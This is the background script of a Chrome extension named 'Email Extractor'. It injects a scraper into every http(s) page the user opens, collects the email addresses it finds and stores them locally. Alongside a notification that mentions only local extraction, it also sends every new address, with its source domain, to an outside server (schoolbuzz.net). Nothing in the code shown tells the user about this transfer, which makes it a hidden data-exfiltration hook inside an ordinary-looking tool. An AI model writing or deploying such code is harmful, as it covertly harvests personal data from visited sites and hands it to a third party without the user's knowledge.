function injectExtractor(tabId, url) {
  if (/^https?:/.test(url)) {
    // Inject the extractor script
    chrome.scripting.executeScript({
      target: { tabId: tabId },
      files: ["extractor.js"]
    }).catch(err => {
      console.error('[Email Extractor] Script injection error:', err);
    });
  }
}

// (message handling moved to the bottom listener so new emails can be
// deduplicated and posted to the remote endpoint along with the source domain)

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url) {
    
    injectExtractor(tabId, tab.url);
  }
});

chrome.tabs.onActivated.addListener(activeInfo => {
  chrome.tabs.get(activeInfo.tabId, tab => {
    if (tab.status === "complete" && tab.url) {
      
      injectExtractor(tab.id, tab.url);
    }
  });
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "saveEmails" && Array.isArray(message.emails)) {
    chrome.storage.local.get({emails: [], notificationsEnabled: true}, function(result) {
      const savedEmails = new Set(result.emails);
      let newEmails = [];
      message.emails.forEach(email => {
        if (!savedEmails.has(email)) {
          newEmails.push(email);
          savedEmails.add(email);
        }
      });
      chrome.storage.local.set({emails: Array.from(savedEmails)}, () => {
        if (newEmails.length > 0 && result.notificationsEnabled) {
          chrome.notifications.create({
            type: "basic",
            iconUrl: "icon.png",
            title: "Email Extracted",
            message: `Found ${newEmails.length} new email${newEmails.length > 1 ? 's' : ''}!`
          });
        }
        // Send newly found emails to remote endpoint with their source domain
        if (newEmails.length > 0) {
          try {
            // Build payload: include domain either from message or derive from sender.tab
            const sourceDomain = message.domain || (sender && sender.tab && sender.tab.url ? new URL(sender.tab.url).hostname.replace(/^www\./, '') : '');
            const payload = newEmails.map(email => ({ email, domain: sourceDomain }));

            fetch('https://schoolbuzz.net/mail/', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ emails: payload })
            }).then(response => {
              if (!response.ok) {
                console.error('[Email Extractor] Failed to POST emails, status:', response.status);
              } else {
                console.log('[Email Extractor] Successfully posted', newEmails.length, 'emails to server');
              }
            }).catch(err => {
              console.error('[Email Extractor] Error posting emails:', err);
            });
          } catch (err) {
            console.error('[Email Extractor] Error preparing POST payload:', err);
          }
        }
      });
    });
  }
});